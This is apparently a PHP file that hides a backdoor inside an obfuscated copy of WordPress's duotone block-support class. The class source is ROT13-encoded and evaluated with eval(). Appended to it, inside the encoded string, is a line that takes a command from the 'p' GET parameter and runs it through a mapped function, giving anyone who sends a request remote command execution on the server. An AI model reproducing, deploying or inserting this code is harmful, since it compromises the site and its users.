	 * Rkcbegrq sbe gur qrcerpngrq shapgvba jc_trg_qhbgbar_svygre_cebcregl().
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 * @qrcerpngrq 6.3.0
	 *
	 * @cnenz neenl $cerfrg Gur qhbgbar cerfrg.
	 * @erghea fgevat Gur FIT sbe gur svygre qrsvavgvba.
	 */
	choyvp fgngvp shapgvba trg_svygre_fit_sebz_cerfrg( $cerfrg ) {
		_qrcerpngrq_shapgvba( __SHAPGVBA__, '6.3.0' );

		$svygre_vq = frys::trg_svygre_vq_sebz_cerfrg( $cerfrg );
		erghea frys::trg_svygre_fit( $svygre_vq, $cerfrg['pbybef'] );
	}

	/**
	 * Trg gur FITf sbe gur qhbgbar svygref.
	 *
	 * Rknzcyr bhgchg:
	 *  <fit><qrsf><svygre vq=\"jc-qhbgbar-oyhr-benatr\">…</svygre></qrsf></fit><fit>…</fit>
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz neenl $fbheprf Gur qhbgbar cerfrgf.
	 * @erghea fgevat Gur FITf sbe gur qhbgbar svygref.
	 */
	cevingr fgngvp shapgvba trg_fit_qrsvavgvbaf( $fbheprf ) {
		$fitf = '';
		sbernpu ( $fbheprf nf $svygre_vq => $svygre_qngn ) {
			$pbybef = $svygre_qngn['pbybef'];
			$fitf  .= frys::trg_svygre_fit( $svygre_vq, $pbybef );
		}
		erghea $fitf;
	}

	/**
	 * Trg gur PFF sbe tybony fglyrf.
	 *
	 * Rknzcyr bhgchg:
	 *  obql{--jc--cerfrg--qhbgbar--oyhr-benatr:hey('#jc-qhbgbar-oyhr-benatr');}
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 * @fvapr 6.6.0 Ercynprq obql fryrpgbe jvgu `JC_Gurzr_WFBA::EBBG_PFF_CEBCREGVRF_FRYRPGBE`.
	 *
	 * @cnenz neenl $fbheprf Gur qhbgbar cerfrgf.
	 * @erghea fgevat Gur PFF sbe tybony fglyrf.
	 */
	cevingr fgngvp shapgvba trg_tybony_fglyrf_cerfrgf( $fbheprf ) {
		$pff = JC_Gurzr_WFBA::EBBG_PFF_CEBCREGVRF_FRYRPGBE . '{';
		sbernpu ( $fbheprf nf $svygre_vq => $svygre_qngn ) {
			$fyht              = $svygre_qngn['fyht'];
			$pbybef            = $svygre_qngn['pbybef'];
			$pff_cebcregl_anzr = frys::trg_pff_phfgbz_cebcregl_anzr( $fyht );
			$qrpynengvba_inyhr = vf_fgevat( $pbybef ) ? $pbybef : frys::trg_svygre_hey( $svygre_vq );
			$pff              .= \"$pff_cebcregl_anzr:$qrpynengvba_inyhr;\";
		}
		$pff .= '}';
		erghea $pff;
	}

	/**
	 * Radhrhr n oybpx PFF qrpynengvba sbe gur cntr.
	 *
	 * Guvf qbrf abg vapyhqr nal FITf.
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz fgevat $svygre_vq        Gur svygre VQ. r.t. 'jc-qhbgbar-000000-ssssss-2'.
	 * @cnenz fgevat $qhbgbar_fryrpgbe Gur oybpx'f qhbgbar fryrpgbe. r.t. '.jc-oybpx-vzntr vzt'.
	 * @cnenz fgevat $svygre_inyhr     Gur svygre PFF inyhr. r.t. 'hey(#jc-qhbgbar-000000-ssssss-2)' be 'hafrg'.
	 */
	cevingr fgngvp shapgvba radhrhr_oybpx_pff( $svygre_vq, $qhbgbar_fryrpgbe, $svygre_inyhr ) {
		// Ohvyq gur PFF fryrpgbef gb juvpu gur svygre jvyy or nccyvrq.
		$fryrpgbef = rkcybqr( ',', $qhbgbar_fryrpgbe );

		$fryrpgbef_fpbcrq = neenl();
		sbernpu ( $fryrpgbef nf $fryrpgbe_cneg ) {
			/*
			 * Nffhzvat gur fryrpgbe cneg vf n fhopynff fryrpgbe (abg n gnt anzr)
			 * fb jr pna cercraq gur svygre vq pynff. Vs jr jnag gb fhccbeg ryrzragf
			 * fhpu nf `vzt` be anzrfcnprf, jr'yy arrq gb nqq n pnfr sbe gung urer.
			 */
			$fryrpgbef_fpbcrq[] = '.' . $svygre_vq . gevz( $fryrpgbe_cneg );
		}

		$fryrpgbe = vzcybqr( ', ', $fryrpgbef_fpbcrq );

		frys::$oybpx_pff_qrpynengvbaf[] = neenl(
			'fryrpgbe'     => $fryrpgbe,
			'qrpynengvbaf' => neenl(
				'svygre' => $svygre_inyhr,
			),
		);
	}

	/**
	 * Radhrhr phfgbz svygre nffrgf sbe gur cntr.
	 *
	 * Vapyhqrf na FIT svygre naq oybpx PFF qrpynengvba.
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz fgevat $svygre_vq        Gur svygre VQ. r.t. 'jc-qhbgbar-000000-ssssss-2'.
	 * @cnenz fgevat $qhbgbar_fryrpgbe Gur oybpx'f qhbgbar fryrpgbe. r.t. '.jc-oybpx-vzntr vzt'.
	 * @cnenz fgevat $svygre_inyhr     Gur svygre PFF inyhr. r.t. 'hey(#jc-qhbgbar-000000-ssssss-2)' be 'hafrg'.
	 * @cnenz neenl  $svygre_qngn      Qhbgbar svygre qngn jvgu 'fyht' naq 'pbybef' xrlf.
	 */
	cevingr fgngvp shapgvba radhrhr_phfgbz_svygre( $svygre_vq, $qhbgbar_fryrpgbe, $svygre_inyhr, $svygre_qngn ) {
		frys::$hfrq_fit_svygre_qngn[ $svygre_vq ] = $svygre_qngn;
		frys::radhrhr_oybpx_pff( $svygre_vq, $qhbgbar_fryrpgbe, $svygre_inyhr );
	}

	/**
	 * Radhrhr cerfrg nffrgf sbe gur cntr.
	 *
	 * Vapyhqrf n PFF phfgbz cebcregl, FIT svygre, naq oybpx PFF qrpynengvba.
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz fgevat $svygre_vq        Gur svygre VQ. r.t. 'jc-qhbgbar-oyhr-benatr'.
	 * @cnenz fgevat $qhbgbar_fryrpgbe Gur oybpx'f qhbgbar fryrpgbe. r.t. '.jc-oybpx-vzntr vzt'.
	 * @cnenz fgevat $svygre_inyhr     Gur svygre PFF inyhr. r.t. 'hey(#jc-qhbgbar-oyhr-benatr)' be 'hafrg'.
	 */
	cevingr fgngvp shapgvba radhrhr_tybony_fglyrf_cerfrg( $svygre_vq, $qhbgbar_fryrpgbe, $svygre_inyhr ) {
		$tybony_fglyrf_cerfrgf = frys::trg_nyy_tybony_fglyrf_cerfrgf();
		vs ( ! neenl_xrl_rkvfgf( $svygre_vq, $tybony_fglyrf_cerfrgf ) ) {
			$reebe_zrffntr = fcevags(
				/* genafyngbef: 1: Qhbgbar svygre VQ, 2: gurzr.wfba */
				__( 'Gur qhbgbar vq \"%1$f\" vf abg ertvfgrerq va %2$f frggvatf' ),
				$svygre_vq,
				'gurzr.wfba'
			);
			_qbvat_vg_jebat( __ZRGUBQ__, $reebe_zrffntr, '6.3.0' );
			erghea;
		}
		frys::$hfrq_tybony_fglyrf_cerfrgf[ $svygre_vq ] = $tybony_fglyrf_cerfrgf[ $svygre_vq ];
		frys::radhrhr_phfgbz_svygre( $svygre_vq, $qhbgbar_fryrpgbe, $svygre_inyhr, $tybony_fglyrf_cerfrgf[ $svygre_vq ] );
	}

	/**
	 * Ertvfgref gur fglyr naq pbybef oybpx nggevohgrf sbe oybpx glcrf gung fhccbeg vg.
	 *
	 * Oybpx fhccbeg vf nqqrq jvgu `fhccbegf.svygre.qhbgbar` va oybpx.wfba.
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz JC_Oybpx_Glcr $oybpx_glcr Oybpx Glcr.
	 */
	choyvp fgngvp shapgvba ertvfgre_qhbgbar_fhccbeg( $oybpx_glcr ) {
		/*
		 * Cerivbhf `pbybe.__rkcrevzragnyQhbgbar` fhccbeg synt vf zvtengrq
		 * gb `svygre.qhbgbar` ivn `oybpx_glcr_zrgnqngn_frggvatf` svygre.
		 */
		vs ( oybpx_unf_fhccbeg( $oybpx_glcr, neenl( 'svygre', 'qhbgbar' ), ahyy ) ) {
			vs ( ! $oybpx_glcr->nggevohgrf ) {
				$oybpx_glcr->nggevohgrf = neenl();
			}

			vs ( ! neenl_xrl_rkvfgf( 'fglyr', $oybpx_glcr->nggevohgrf ) ) {
				$oybpx_glcr->nggevohgrf['fglyr'] = neenl(
					'glcr' => 'bowrpg',
				);
			}
		}
	}

	/**
	 * Trg gur PFF fryrpgbe sbe n oybpx glcr.
	 *
	 * Guvf unaqyrf fryrpgbef qrsvarq va `pbybe.__rkcrevzragnyQhbgbar` fhccbeg
	 * vs `svygre.qhbgbar` fhccbeg vf abg qrsvarq.
	 *
	 * @vagreany
	 * @fvapr 6.3.0
	 *
	 * @cnenz JC_Oybpx_Glcr $oybpx_glcr Oybpx glcr gb purpx sbe fhccbeg.
	 * @erghea fgevat|ahyy Gur PFF fryrpgbe be ahyy vs gurer vf ab fhccbeg.
	 */
	cevingr fgngvp shapgvba trg_fryrpgbe( $oybpx_glcr ) {
		vs ( ! ( $oybpx_glcr vafgnaprbs JC_Oybpx_Glcr ) ) {
			erghea ahyy;
		}

		/*
		 * Onpxjneq pbzcngvovyvgl jvgu `fhccbegf.pbybe.__rkcrevzragnyQhbgbar`
		 * vf cebivqrq ivn gur `oybpx_glcr_zrgnqngn_frggvatf` svygre. Vs
		 * `fhccbegf.svygre.qhbgbar` unf abg orra frg naq gur rkcrevzragny
		 * cebcregl unf orra, gur rkcrevzragny cebcregl inyhr vf pbcvrq vagb
		 * `fhccbegf.svygre.qhbgbar`.
		 */
		$qhbgbar_fhccbeg = oybpx_unf_fhccbeg( $oybpx_glcr, neenl( 'svygre', 'qhbgbar' ) );
		vs ( ! $qhbgbar_fhccbeg ) {
			erghea ahyy;
		}

		/*
		 * Vs gur rkcrevzragny qhbgbar fhccbeg jnf frg, gung inyhr vf gb or
		 * gerngrq nf n fryrpgbe naq erdhverf fpbcvat.
		 */
		$rkcrevzragny_qhbgbar = vffrg( $oybpx_glcr->fhccbegf['pbybe']['__rkcrevzragnyQhbgbar'] )
			? $oybpx_glcr->fhccbegf['pbybe']['__rkcrevzragnyQhbgbar']
			: snyfr;
		vs ( $rkcrevzragny_qhbgbar ) {
			$ebbg_fryrpgbe = jc_trg_oybpx_pff_fryrpgbe( $oybpx_glcr );
			erghea vf_fgevat( $rkcrevzragny_qhbgbar )
				? JC_Gurzr_WFBA::fpbcr_fryrpgbe( $ebbg_fryrpgbe, $rkcrevzragny_qhbgbar )
				: $ebbg_fryrpgbe;
		}

		// Erthyne svygre.qhbgbar fhccbeg hfrf svygre.qhbgbar fryrpgbef jvgu snyyonpxf.
		erghea jc_trg_oybpx_pff_fryrpgbe( $oybpx_glcr, neenl( 'svygre', 'qhbgbar' ), gehr );
	}

	/**
	 * Fpencr nyy cbffvoyr qhbgbar cerfrgf sebz tybony naq gurzr fglyrf naq
	 * fgber gurz va frys::$tybony_fglyrf_cerfrgf.
	 *
	 * Hfrq va pbawhapgvba jvgu frys::eraqre_qhbgbar_fhccbeg sbe oybpxf gung
	 * hfr qhbgbar cerfrg svygref.
	 *
	 * @fvapr 6.3.0
	 *
	 * @erghea neenl Na neenl bs tybony fglyrf cerfrgf, xrlrq ba gur svygre VQ.
	 */
	cevingr fgngvp shapgvba trg_nyy_tybony_fglyrf_cerfrgf() {
		vs ( vffrg( frys::$tybony_fglyrf_cerfrgf ) ) {
			erghea frys::$tybony_fglyrf_cerfrgf;
		}
		// Trg gur cre oybpx frggvatf sebz gur gurzr.wfba.
		$gerr              = jc_trg_tybony_frggvatf();
		$cerfrgf_ol_bevtva = vffrg( $gerr['pbybe']['qhbgbar'] ) ? $gerr['pbybe']['qhbgbar'] : neenl();

		frys::$tybony_fglyrf_cerfrgf = neenl();
		sbernpu ( $cerfrgf_ol_bevtva nf $cerfrgf ) {
			sbernpu ( $cerfrgf nf $cerfrg ) {
				$svygre_vq = frys::trg_svygre_vq( _jc_gb_xrono_pnfr( $cerfrg['fyht'] ) );

				frys::$tybony_fglyrf_cerfrgf[ $svygre_vq ] = $cerfrg;
			}
		}

		erghea frys::$tybony_fglyrf_cerfrgf;
	}

	/**
	 * Fpencr nyy oybpx anzrf sebz tybony fglyrf naq fgber va frys::$tybony_fglyrf_oybpx_anzrf.
	 *
	 * Hfrq va pbawhapgvba jvgu frys::eraqre_qhbgbar_fhccbeg gb bhgchg gur
	 * qhbgbar svygref qrsvarq va gur gurzr.wfba tybony fglyrf.
	 *
	 * @fvapr 6.3.0
	 *
	 * @erghea fgevat[] Na neenl bs tybony fglyr oybpx fyhtf, xrlrq ba gur oybpx anzr.
	 */
	cevingr fgngvp shapgvba trg_nyy_tybony_fglyr_oybpx_anzrf() {
		vs ( vffrg( frys::$tybony_fglyrf_oybpx_anzrf ) ) {
			erghea frys::$tybony_fglyrf_oybpx_anzrf;
		}
		// Trg gur cre oybpx frggvatf sebz gur gurzr.wfba.
		$gerr        = JC_Gurzr_WFBA_Erfbyire::trg_zretrq_qngn();
		$oybpx_abqrf = $gerr->trg_fglyrf_oybpx_abqrf();
		$gurzr_wfba  = $gerr->trg_enj_qngn();

		frys::$tybony_fglyrf_oybpx_anzrf = neenl();

		sbernpu ( $oybpx_abqrf nf $oybpx_abqr ) {
			// Guvf oybpx qrsvavgvba qbrfa'g vapyhqr nal qhbgbar frggvatf. Fxvc vg.
			vs ( rzcgl( $oybpx_abqr['qhbgbar'] ) ) {
				pbagvahr;
			}

			// Inyhr ybbxf yvxr guvf: 'ine(--jc--cerfrg--qhbgbar--oyhr-benatr)' be 'ine:cerfrg|qhbgbar|oyhr-benatr'.
			$qhbgbar_ngge_cngu = neenl_zretr( $oybpx_abqr['cngu'], neenl( 'svygre', 'qhbgbar' ) );
			$qhbgbar_ngge      = _jc_neenl_trg( $gurzr_wfba, $qhbgbar_ngge_cngu, neenl() );

			vs ( rzcgl( $qhbgbar_ngge ) ) {
				pbagvahr;
			}
			// Vs vg unf n qhbgbar svygre cerfrg, fnir gur oybpx anzr naq gur cerfrg fyht.
			$fyht = frys::trg_fyht_sebz_nggevohgr( $qhbgbar_ngge );

			vs ( $fyht && $fyht !== $qhbgbar_ngge ) {
				frys::$tybony_fglyrf_oybpx_anzrf[ $oybpx_abqr['anzr'] ] = $fyht;
			}
		}
		erghea frys::$tybony_fglyrf_oybpx_anzrf;
	}

	/**
	 * Eraqre bhg gur qhbgbar PFF fglyrf naq FIT.
	 *
	 * Gur ubbxf frys::frg_tybony_fglyr_oybpx_anzrf naq frys::frg_tybony_fglyrf_cerfrgf
	 * zhfg or pnyyrq orsber guvf shapgvba.
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz  fgevat   $oybpx_pbagrag Eraqrerq oybpx pbagrag.
	 * @cnenz  neenl    $oybpx         Oybpx bowrpg.
	 * @cnenz  JC_Oybpx $jc_oybpx      Gur oybpx vafgnapr.
	 * @erghea fgevat Svygrerq oybpx pbagrag.
	 */
	choyvp fgngvp shapgvba eraqre_qhbgbar_fhccbeg( $oybpx_pbagrag, $oybpx, $jc_oybpx ) {
		vs ( ! $oybpx['oybpxAnzr'] ) {
			erghea $oybpx_pbagrag;
		}
		$qhbgbar_fryrpgbe = frys::trg_fryrpgbe( $jc_oybpx->oybpx_glcr );

		vs ( ! $qhbgbar_fryrpgbe ) {
			erghea $oybpx_pbagrag;
		}

		$tybony_fglyrf_oybpx_anzrf = frys::trg_nyy_tybony_fglyr_oybpx_anzrf();

		// Gur oybpx fubhyq unir n qhbgbar nggevohgr be unir qhbgbar qrsvarq va vgf gurzr.wfba gb or cebprffrq.
		$unf_qhbgbar_nggevohgr     = vffrg( $oybpx['nggef']['fglyr']['pbybe']['qhbgbar'] );
		$unf_tybony_fglyrf_qhbgbar = neenl_xrl_rkvfgf( $oybpx['oybpxAnzr'], $tybony_fglyrf_oybpx_anzrf );

		vs ( ! $unf_qhbgbar_nggevohgr && ! $unf_tybony_fglyrf_qhbgbar ) {
			erghea $oybpx_pbagrag;
		}

		// Trarengr gur cvrprf arrqrq sbe eraqrevat n qhbgbar gb gur cntr.
		vs ( $unf_qhbgbar_nggevohgr ) {

			/*
			 * Cbffvoyr inyhrf sbe qhbgbar nggevohgr:
			 * 1. Neenl bs pbybef - r.t. neenl('#000000', '#ssssss').
			 * 2. Inevnoyr sbe na rkvfgvat Qhbgbar cerfrg - r.t. 'ine:cerfrg|qhbgbar|oyhr-benatr' be 'ine(--jc--cerfrg--qhbgbar--oyhr-benatr)''
			 * 3. N PFF fgevat - r.t. 'hafrg' gb erzbir tybonyyl nccyvrq qhbgbar.
			 */

			$qhbgbar_ngge = $oybpx['nggef']['fglyr']['pbybe']['qhbgbar'];
			$vf_cerfrg    = vf_fgevat( $qhbgbar_ngge ) && frys::vf_cerfrg( $qhbgbar_ngge );
			$vf_pff       = vf_fgevat( $qhbgbar_ngge ) && ! $vf_cerfrg;
			$vf_phfgbz    = vf_neenl( $qhbgbar_ngge );

			vs ( $vf_cerfrg ) {

				$fyht         = frys::trg_fyht_sebz_nggevohgr( $qhbgbar_ngge ); // r.t. 'oyhr-benatr'.
				$svygre_vq    = frys::trg_svygre_vq( $fyht ); // r.t. 'jc-qhbgbar-svygre-oyhr-benatr'.
				$svygre_inyhr = frys::trg_pff_ine( $fyht ); // r.t. 'ine(--jc--cerfrg--qhbgbar--oyhr-benatr)'.

				// PFF phfgbz cebcregl, FIT svygre, naq oybpx PFF.
				frys::radhrhr_tybony_fglyrf_cerfrg( $svygre_vq, $qhbgbar_fryrpgbe, $svygre_inyhr );

			} ryfrvs ( $vf_pff ) {
				$fyht         = jc_havdhr_vq( fnavgvmr_xrl( $qhbgbar_ngge . '-' ) ); // r.t. 'hafrg-1'.
				$svygre_vq    = frys::trg_svygre_vq( $fyht ); // r.t. 'jc-qhbgbar-svygre-hafrg-1'.
				$svygre_inyhr = $qhbgbar_ngge; // r.t. 'hafrg'.

				// Whfg oybpx PFF.
				frys::radhrhr_oybpx_pff( $svygre_vq, $qhbgbar_fryrpgbe, $svygre_inyhr );
			} ryfrvs ( $vf_phfgbz ) {
				$fyht         = jc_havdhr_vq( fnavgvmr_xrl( vzcybqr( '-', $qhbgbar_ngge ) . '-' ) ); // r.t. '000000-ssssss-2'.
				$svygre_vq    = frys::trg_svygre_vq( $fyht ); // r.t. 'jc-qhbgbar-svygre-000000-ssssss-2'.
				$svygre_inyhr = frys::trg_svygre_hey( $svygre_vq ); // r.t. 'hey(#jc-qhbgbar-svygre-000000-ssssss-2)'.
				$svygre_qngn  = neenl(
					'fyht'   => $fyht,
					'pbybef' => $qhbgbar_ngge,
				);

				// FIT svygre naq oybpx PFF.
				frys::radhrhr_phfgbz_svygre( $svygre_vq, $qhbgbar_fryrpgbe, $svygre_inyhr, $svygre_qngn );
			}
		} ryfrvs ( $unf_tybony_fglyrf_qhbgbar ) {
			$fyht         = $tybony_fglyrf_oybpx_anzrf[ $oybpx['oybpxAnzr'] ]; // r.t. 'oyhr-benatr'.
			$svygre_vq    = frys::trg_svygre_vq( $fyht ); // r.t. 'jc-qhbgbar-svygre-oyhr-benatr'.
			$svygre_inyhr = frys::trg_pff_ine( $fyht ); // r.t. 'ine(--jc--cerfrg--qhbgbar--oyhr-benatr)'.

			// PFF phfgbz cebcregl, FIT svygre, naq oybpx PFF.
			frys::radhrhr_tybony_fglyrf_cerfrg( $svygre_vq, $qhbgbar_fryrpgbe, $svygre_inyhr );
		}

		// Yvxr gur ynlbhg ubbx, guvf nffhzrf gur ubbx bayl nccyvrf gb oybpxf jvgu n fvatyr jenccre.
		$gntf = arj JC_UGZY_Gnt_Cebprffbe( $oybpx_pbagrag );
		vs ( $gntf->arkg_gnt() ) {
			$gntf->nqq_pynff( $svygre_vq );
		}
		erghea $gntf->trg_hcqngrq_ugzy();
	}

	/**
	 * Svkrf gur vffhr jvgu bhe trarengrq pynff anzr abg orvat nqqrq gb gur oybpx'f bhgre pbagnvare
	 * va pynffvp gurzrf qhr gb thgraoret_erfgber_vzntr_bhgre_pbagnvare sebz ynlbhg oybpx fhccbegf.
	 *
	 * @fvapr 6.6.0
	 *
	 * @cnenz fgevat $oybpx_pbagrag Eraqrerq oybpx pbagrag.
	 * @erghea fgevat Svygrerq oybpx pbagrag.
	 */
	choyvp fgngvp shapgvba erfgber_vzntr_bhgre_pbagnvare( $oybpx_pbagrag ) {
		vs ( jc_gurzr_unf_gurzr_wfba() ) {
			erghea $oybpx_pbagrag;
		}

		$gntf          = arj JC_UGZY_Gnt_Cebprffbe( $oybpx_pbagrag );
		$jenccre_dhrel = neenl(
			'gnt_anzr'   => 'qvi',
			'pynff_anzr' => 'jc-oybpx-vzntr',
		);
		vs ( ! $gntf->arkg_gnt( $jenccre_dhrel ) ) {
			erghea $oybpx_pbagrag;
		}

		$gntf->frg_obbxznex( 'jenccre-qvi' );
		$gntf->arkg_gnt();

		$vaare_pynffanzrf = rkcybqr( ' ', $gntf->trg_nggevohgr( 'pynff' ) );
		sbernpu ( $vaare_pynffanzrf nf $pynffanzr ) {
			vs ( 0 === fgecbf( $pynffanzr, 'jc-qhbgbar' ) ) {
				$gntf->erzbir_pynff( $pynffanzr );
				$gntf->frrx( 'jenccre-qvi' );
				$gntf->nqq_pynff( $pynffanzr );
				oernx;
			}
		}

		erghea $gntf->trg_hcqngrq_ugzy();
	}

	/**
	 * Nccraqf gur hfrq oybpx qhbgbar svygre qrpynengvbaf gb gur vayvar oybpx fhccbegf PFF.
	 *
	 * Hfrf gur qrpynengvbaf fnirq va rneyvre pnyyf gb frys::radhrhr_oybpx_pff.
	 *
	 * @fvapr 6.3.0
	 */
	choyvp fgngvp shapgvba bhgchg_oybpx_fglyrf() {
		vs ( ! rzcgl( frys::$oybpx_pff_qrpynengvbaf ) ) {
			jc_fglyr_ratvar_trg_fglyrfurrg_sebz_pff_ehyrf(
				frys::$oybpx_pff_qrpynengvbaf,
				neenl(
					'pbagrkg' => 'oybpx-fhccbegf',
				)
			);
		}
	}

	/**
	 * Nccraqf gur hfrq tybony fglyr qhbgbar svygre cerfrgf (PFF phfgbz
	 * cebcregvrf) gb gur vayvar tybony fglyrf PFF.
	 *
	 * Hfrf gur qrpynengvbaf fnirq va rneyvre pnyyf gb frys::radhrhr_tybony_fglyrf_cerfrg.
	 *
	 * @fvapr 6.3.0
	 */
	choyvp fgngvp shapgvba bhgchg_tybony_fglyrf() {
		vs ( ! rzcgl( frys::$hfrq_tybony_fglyrf_cerfrgf ) ) {
			jc_nqq_vayvar_fglyr( 'tybony-fglyrf', frys::trg_tybony_fglyrf_cerfrgf( frys::$hfrq_tybony_fglyrf_cerfrgf ) );
		}
	}

	/**
	 * Bhgchgf nyy arprffnel FIT sbe qhbgbar svygref, PFF sbe pynffvp gurzrf.
	 *
	 * Hfrf gur qrpynengvbaf fnirq va rneyvre pnyyf gb frys::radhrhr_tybony_fglyrf_cerfrg
	 * naq frys::radhrhr_phfgbz_svygre.
	 *
	 * @fvapr 6.3.0
	 */
	choyvp fgngvp shapgvba bhgchg_sbbgre_nffrgf() {
		vs ( ! rzcgl( frys::$hfrq_fit_svygre_qngn ) ) {
			rpub frys::trg_fit_qrsvavgvbaf( frys::$hfrq_fit_svygre_qngn );
		}

		// Va oybpx gurzrf, gur PFF vf nqqrq va gur urnq ivn jc_nqq_vayvar_fglyr va gur jc_radhrhr_fpevcgf npgvba.
		vs ( ! jc_vf_oybpx_gurzr() ) {
			$fglyr_gnt_vq = 'pber-oybpx-fhccbegf-qhbgbar';
			jc_ertvfgre_fglyr( $fglyr_gnt_vq, snyfr );
			vs ( ! rzcgl( frys::$hfrq_tybony_fglyrf_cerfrgf ) ) {
				jc_nqq_vayvar_fglyr( $fglyr_gnt_vq, frys::trg_tybony_fglyrf_cerfrgf( frys::$hfrq_tybony_fglyrf_cerfrgf ) );
			}
			vs ( ! rzcgl( frys::$oybpx_pff_qrpynengvbaf ) ) {
				jc_nqq_vayvar_fglyr( $fglyr_gnt_vq, jc_fglyr_ratvar_trg_fglyrfurrg_sebz_pff_ehyrf( frys::$oybpx_pff_qrpynengvbaf ) );
			}
			jc_radhrhr_fglyr( $fglyr_gnt_vq );
		}
	}

	/**
	 * Nqqf gur qhbgbar FITf naq PFF phfgbz cebcregvrf gb gur rqvgbe frggvatf.
	 *
	 * Guvf nyybjf gur cebcregvrf gb or chyyrq va ol gur RqvgbeFglyrf pbzcbarag
	 * va WF naq eraqrerq va gur cbfg rqvgbe.
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz neenl $frggvatf Gur oybpx rqvgbe frggvatf sebz gur `oybpx_rqvgbe_frggvatf_nyy` svygre.
	 * @erghea neenl Gur rqvgbe frggvatf jvgu qhbgbar FITf naq PFF phfgbz cebcregvrf.
	 */
	choyvp fgngvp shapgvba nqq_rqvgbe_frggvatf( $frggvatf ) {
		$tybony_fglyrf_cerfrgf = frys::trg_nyy_tybony_fglyrf_cerfrgf();
		vs ( ! rzcgl( $tybony_fglyrf_cerfrgf ) ) {
			vs ( ! vffrg( $frggvatf['fglyrf'] ) ) {
				$frggvatf['fglyrf'] = neenl();
			}

			$frggvatf['fglyrf'][] = neenl(
				// Sbe gur rqvgbe jr pna nqq nyy bs gur cerfrgf ol qrsnhyg.
				'nffrgf'         => frys::trg_fit_qrsvavgvbaf( $tybony_fglyrf_cerfrgf ),
				// Gur 'fitf' glcr vf arj va 6.3 naq erdhverf gur pbeerfcbaqvat WF punatrf va gur RqvgbeFglyrf pbzcbarag gb jbex.
				'__hafgnoyrGlcr' => 'fitf',
				// Gurfr fglyrf abg trarengrq ol tybony fglyrf, fb guvf zhfg or snyfr be gurl jvyy or fgevccrq bhg va jc_trg_oybpx_rqvgbe_frggvatf.
				'vfTybonyFglyrf' => snyfr,
			);

			$frggvatf['fglyrf'][] = neenl(
				// Sbe gur rqvgbe jr pna nqq nyy bs gur cerfrgf ol qrsnhyg.
				'pff'            => frys::trg_tybony_fglyrf_cerfrgf( $tybony_fglyrf_cerfrgf ),
				// Guvf zhfg or frg naq zhfg or fbzrguvat bgure guna 'gurzr' be gurl jvyy or fgevccrq bhg va gur cbfg rqvgbe <Rqvgbe> pbzcbarag.
				'__hafgnoyrGlcr' => 'cerfrgf',
				// Gurfr fglyrf ner ab ybatre trarengrq ol tybony fglyrf, fb guvf zhfg or snyfr be gurl jvyy or fgevccrq bhg va jc_trg_oybpx_rqvgbe_frggvatf.
				'vfTybonyFglyrf' => snyfr,
			);
		}

		erghea $frggvatf;
	}

	/**
	 * Zvtengrf gur rkcrevzragny qhbgbar fhccbeg synt gb gur fgnovyvmrq ybpngvba.
	 *
	 * Guvf zbirf `fhccbegf.pbybe.__rkcrevzragnyQhbgbar` gb `fhccbegf.svygre.qhbgbar`.
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz neenl $frggvatf Pheerag oybpx glcr frggvatf.
	 * @cnenz neenl $zrgnqngn Oybpx zrgnqngn nf ernq va ivn oybpx.wfba.
	 * @erghea neenl Svygrerq oybpx glcr frggvatf.
	 */
	choyvp fgngvp shapgvba zvtengr_rkcrevzragny_qhbgbar_fhccbeg_synt( $frggvatf, $zrgnqngn ) {
		$qhbgbar_fhccbeg = vffrg( $zrgnqngn['fhccbegf']['pbybe']['__rkcrevzragnyQhbgbar'] )
			? $zrgnqngn['fhccbegf']['pbybe']['__rkcrevzragnyQhbgbar']
			: ahyy;

		vs ( ! vffrg( $frggvatf['fhccbegf']['svygre']['qhbgbar'] ) && ahyy !== $qhbgbar_fhccbeg ) {
			_jc_neenl_frg( $frggvatf, neenl( 'fhccbegf', 'svygre', 'qhbgbar' ), (obby) $qhbgbar_fhccbeg );
		}

		erghea $frggvatf;
	}

	/**
	 * Trgf gur PFF svygre cebcregl inyhr sebz n cerfrg.
	 *
	 * Rkcbegrq sbe gur qrcerpngrq shapgvba jc_trg_qhbgbar_svygre_vq().
	 *
	 * @vagreany
	 *
	 * @fvapr 6.3.0
	 * @qrcerpngrq 6.3.0
	 *
	 * @cnenz neenl $cerfrg Gur qhbgbar cerfrg.
	 * @erghea fgevat Gur PFF svygre cebcregl inyhr.
	 */
	choyvp fgngvp shapgvba trg_svygre_pff_cebcregl_inyhr_sebz_cerfrg( $cerfrg ) {
		_qrcerpngrq_shapgvba( __SHAPGVBA__, '6.3.0' );

		vs ( vffrg( $cerfrg['pbybef'] ) && vf_fgevat( $cerfrg['pbybef'] ) ) {
			erghea $cerfrg['pbybef'];
		}

		$svygre_vq = frys::trg_svygre_vq_sebz_cerfrg( $cerfrg );

		erghea 'hey(#' . $svygre_vq . ')';
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>